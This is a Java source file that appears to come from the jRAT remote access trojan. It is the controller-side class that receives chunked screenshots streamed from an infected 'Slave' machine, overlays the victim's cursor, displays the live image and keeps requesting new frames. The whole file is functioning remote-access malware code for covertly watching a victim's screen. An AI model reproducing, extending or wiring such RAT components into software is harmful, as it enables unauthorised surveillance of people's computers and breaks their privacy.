package su.jrat.client.packets.incoming;

import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;

import su.jrat.client.Cursor;
import su.jrat.client.Slave;
import su.jrat.client.packets.outgoing.Packet12RemoteScreen;
import su.jrat.client.ui.frames.FrameRemoteScreen;
import su.jrat.client.utils.ImageUtils;


public class Packet17RemoteScreen extends AbstractIncomingPacket {
	
	protected boolean requestMore = true;
	
	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		FrameRemoteScreen frame = FrameRemoteScreen.instances.get(slave);
		
		int length = dis.readInt();
		
		int x = dis.readInt();
		int y = dis.readInt();
				
		if (frame != null) {
			ByteArrayOutputStream baos = new ByteArrayOutputStream();

			int read = 0;
			int chunkSize;
			
			frame.getProgressBar().setMaximum(length);

			while ((chunkSize = dis.readInt()) != -1) {
				byte[] chunk = new byte[chunkSize];

				read += chunkSize;

				dis.readFully(chunk);

				baos.write(chunk);
				
				frame.getProgressBar().setValue(read);
			}
			
			byte[] array = baos.toByteArray();
						
			BufferedImage image = ImageUtils.decodeImage(array);
			Cursor.drawCursor(slave.getOS(), image.createGraphics(), x, y);
			image.getGraphics().dispose();
			
			frame.update(image);
			
			frame.getProgressBar().setValue(0);
			
			if (requestMore && frame.isRunning()) {
				slave.addToSendQueue(new Packet12RemoteScreen(frame.getImageSize(), frame.getQuality(), frame.getMonitor()));
			}
		} else {
			int chunkSize;
			while ((chunkSize = dis.readInt()) != -1) {
				dis.readFully(new byte[chunkSize]);			
			}
		}
	}
}
